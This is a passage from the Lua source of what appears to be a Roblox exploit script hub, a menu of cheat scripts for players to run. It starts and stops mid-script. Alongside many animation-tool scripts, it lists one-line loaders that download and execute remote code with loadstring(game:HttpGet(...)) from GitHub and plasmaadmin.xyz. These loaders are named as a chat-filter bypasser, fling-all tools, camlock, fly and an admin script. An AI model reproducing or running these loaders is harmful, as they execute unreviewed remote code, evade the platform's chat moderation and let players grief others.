	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation1 = Instance.new("Animation")
	animation1.AnimationId = ANIMATION_ID

	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2
	
	local animation3 = Instance.new("Animation")
	animation3.AnimationId = ANIMATION_ID3

	tool.Equipped:Connect(function()
		stopAll()

		animTrack1 = animator:LoadAnimation(animation1)
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack3 = animator:LoadAnimation(animation3)

		animTrack1.Priority = Enum.AnimationPriority.Action
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack3.Priority = Enum.AnimationPriority.Action

		animTrack1:Play()
		animTrack2:Play()
		animTrack2:AdjustWeight(999)
		animTrack3:Play()
	end)

	tool.Unequipped:Connect(stopAll)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 twerk tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local TOOL_NAME = "shake dat ass"
local ANIMATION_ID = "rbxassetid://12874447851"

local function giveTool()
	local backpack = LocalPlayer:WaitForChild("Backpack")
	if backpack:FindFirstChild(TOOL_NAME) then return nil end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = backpack

	return tool
end

local function setupTool(tool)
	if not tool then return end

	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then
			animTrack:Stop()
		end

		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
        while true do
        animTrack:Play()
		animTrack.TimePosition = 4.2
        t(0.49)
        end
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 drift tool", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "drift"
local ANIMATION_ID = "rbxassetid://17360699557"

local function giveTool()
	local backpack = LocalPlayer:WaitForChild("Backpack")
	if backpack:FindFirstChild(TOOL_NAME) then return nil end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = backpack

	return tool
end

local function setupTool(tool)
	if not tool then return end

	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local hrp = character:WaitForChild("HumanoidRootPart")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	local animTrack = animator:LoadAnimation(animation)
	animTrack.Priority = Enum.AnimationPriority.Action
	animTrack.Looped = false

	local active = false
	local originalProperties = {}
	local newPartConnection = nil
	local speedcon = nil
	local animationLoopTask = nil

	local function makePartSlippery(part)
		if part:IsA("BasePart") and not part:IsDescendantOf(character) and not originalProperties[part] then
			local props = part.CustomPhysicalProperties
			if props then
				originalProperties[part] = PhysicalProperties.new(
					props.Density,
					props.Friction,
					props.Elasticity,
					props.FrictionWeight,
					props.ElasticityWeight
				)
			else
				originalProperties[part] = PhysicalProperties.new(0.7, 0.3, 0.5)
			end

			part.CustomPhysicalProperties = PhysicalProperties.new(1, 0, 1, 10, 1)
		end
	end

	local function makeAllSlippery()
		for _, part in ipairs(Workspace:GetDescendants()) do
			makePartSlippery(part)
		end
	end

	local function restoreParts()
		for part, props in pairs(originalProperties) do
			if part and part:IsA("BasePart") and part.Parent then
				part.CustomPhysicalProperties = props
			end
		end

		table.clear(originalProperties)
	end

	local function playAnimationAtTime(time)
		if not animTrack.IsPlaying then
			animTrack:Play()
		end
		animTrack.TimePosition = time or 0
	end

	tool.Equipped:Connect(function()
		if active then return end -- Prevent double-activation
		active = true
		
		humanoid.WalkSpeed = 8

		playAnimationAtTime(0)
		
		t(1)

		if not speedcon then
			humanoid.WalkSpeed = 75
			speedcon = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
				if active and humanoid.WalkSpeed ~= 75 then
					humanoid.WalkSpeed = 75
				end
			end)
		end

		task.delay(1, function()
			if not active then return end

			if animationLoopTask then
				animationLoopTask:Disconnect()
				animationLoopTask = nil
			end

			local loopBind = RunService.Heartbeat:Connect(function()
				if not active then return end
				if animTrack.TimePosition >= 10.3 then -- 2.5 + 7.8
					animTrack.TimePosition = 2.5
				end
			end)

			animationLoopTask = loopBind
		end)
		
		makeAllSlippery()

		newPartConnection = Workspace.DescendantAdded:Connect(makePartSlippery)
	end)

	tool.Unequipped:Connect(function()
		if not active then return end
		active = false
		humanoid.WalkSpeed = 16

		if animTrack and animTrack.IsPlaying then
			animTrack:Stop()
		end

		if animationLoopTask then
			animationLoopTask:Disconnect()
			animationLoopTask = nil
		end

		if newPartConnection then
			newPartConnection:Disconnect()
			newPartConnection = nil
		end

		if speedcon then
			speedcon:Disconnect()
			speedcon = nil
		end

		t(1)
		restoreParts()
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("aquamatrix", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
]], "LS")

cscript("gazer chat bypasser", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20stuffs%5D/music%23%5Bchat%20bypasser%5D.lua"))()
]], "LS")

cscript("chat reverser", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20stuffs%5D/music%23%5Bchat%20reverser%5D.lua"))()
]], "LS")

cscript("chat owoifier", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bchat%20stuffs%5D/music%23%5Bchat%20owoifier%5D.lua"))()
]], "LS")

cscript("player camlock", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Bplayer%20camlock%5D.lua"))()
]], "LS")

cscript("r15 fly", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Br15%20fly%5D.lua"))()
]], "LS")

cscript("r6 dances", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Br6%20dances%5D/music%23%5Bloader%5D.lua"))()
]], "LS")

cscript("r15 animation player", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Bfe%20r15%20animation%20player%5D.lua"))()
]], "LS")

cscript("fling tools", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Bfe%20fling%20all%5D.lua"))()
]], "LS")

cscript("server position predictor", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Bserver%20position%20predictor%5D.lua"))()
]], "LS")

cscript("anti bang", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Banti%20bang%5D.lua"))()
]], "CS / SS")

cscript("mute boomboxes", [[
local players = game:GetService("Players"):GetPlayers()

while true do
	for _, player in pairs(players) do
	task.spawn(function()
		if player.Character then
			for _, sound in next, player.Character:GetDescendants() do
				if sound:IsA("Sound") and sound.Playing then
					sound.Playing = false
				end
			end
		end

		local backpack = player:FindFirstChildOfClass("Backpack")
		if backpack then
			for _, sound in next, backpack:GetDescendants() do
				if sound:IsA("Sound") and sound.Playing then
					sound.Playing = false
				end
			end
		end
	end)
end
	t()
end
]], "CS / SS")

cscript("plasma fe", [[
loadstring(game:HttpGet("https://plasmaadmin.xyz/Free-Script"))()
]], "LS")

cscript("dandy's world nametags", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Bdandy's%20world%20nametags%5D.lua"))()
]], "LS")

cscript("super ring parts", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/chesslovers69/Super-ring-parts-v6/refs/heads/main/Bylukaslol"))()
]], "LS")

cscript("legacy chat", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Blegacy%20chat%5D.lua"))()
]], "LS")

cscript("animation logger", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Banimation%20logger%5D.lua"))()
]], "LS")

cscript("r15 fighting stance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "fighting stance"
local ANIMATION_ID = "rbxassetid://116763940575803"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 stomp tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "stomp"
local ANIMATION_ID = "rbxassetid://115048845533448"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(1.3)
    animTrack.Looped = true
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 helicopter tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "helicopter"
local ANIMATION_ID = "rbxassetid://91257498644328"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 kazotsky tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "kazotsky"
local ANIMATION_ID = "rbxassetid://119264600441310"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    humanoid.WalkSpeed = 8
	end)

	tool.Unequipped:Connect(function()
    humanoid.WalkSpeed = 16
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 sit tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "sit"
local ANIMATION_ID = "rbxassetid://97185364700038"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 default dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "default dance"
local ANIMATION_ID = "rbxassetid://88455578674030"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 mm2 zen tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "mm2 zen"
local ANIMATION_ID = "rbxassetid://86872878957632"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 67 tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "67"
local ANIMATION_ID = "rbxassetid://115439144505157"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 dog tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "dog"
local ANIMATION_ID = "rbxassetid://78195344190486"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 tuff idle", [[
local Players = game:GetService("Players")

local IDLE_ANIMATION_ID = "rbxassetid://112627003252867"
local player = Players.LocalPlayer

local function applyIdleAnimation(character)
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:WaitForChild("Animator")

	local idleAnim = Instance.new("Animation")
	idleAnim.AnimationId = IDLE_ANIMATION_ID
	local idleTrack = animator:LoadAnimation(idleAnim)

	local isIdle = false

	local function updateIdleState(speed)
		if speed < 0.1 then
			if not isIdle then
				isIdle = true
				if not idleTrack.IsPlaying then
					idleTrack:Play()
				end
			end
		else
			if isIdle then
				isIdle = false
				if idleTrack.IsPlaying then
					idleTrack:Stop()
				end
			end
		end
	end

	humanoid.Running:Connect(updateIdleState)
	updateIdleState(0)
end

-- Handle current and future characters
player.CharacterAdded:Connect(applyIdleAnimation)
if player.Character then
	applyIdleAnimation(player.Character)
end
]], "CS / SS")

cscript("r15 6 tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "6"
local ANIMATION_ID = "rbxassetid://115439144505157"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 0.3
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 7 tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "7"
local ANIMATION_ID = "rbxassetid://115439144505157"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 1.3
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 helicopter 2 tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "helicopter 2"
local ANIMATION_ID = "rbxassetid://122951149300674"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 right heart tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "right heart"
local ANIMATION_ID = "rbxassetid://84671941093489"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 left heart tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "left heart"
local ANIMATION_ID = "rbxassetid://110936682778213"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 air circle tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "air circle"
local ANIMATION_ID = "rbxassetid://94324173536622"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
